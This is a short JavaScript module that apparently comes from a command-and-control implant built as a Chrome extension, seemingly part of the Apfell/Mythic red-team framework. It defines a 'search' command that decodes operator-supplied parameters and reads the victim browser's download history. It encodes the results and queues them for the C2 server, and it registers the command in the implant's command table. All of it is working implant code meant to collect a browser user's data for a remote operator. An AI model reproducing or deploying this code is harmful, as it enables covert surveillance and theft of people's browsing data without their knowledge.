search = function(task) {
    let args = JSON.parse(atob(task.parameters.toString()));
    chrome.downloads.search(args, function(results) {
        let response = {"task_id":task.task_id, "user_output":JSON.stringify(results, null, 2), "completed": true};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    });
};

C2.commands[search.name] = search;
COMMAND_ENDS_HERE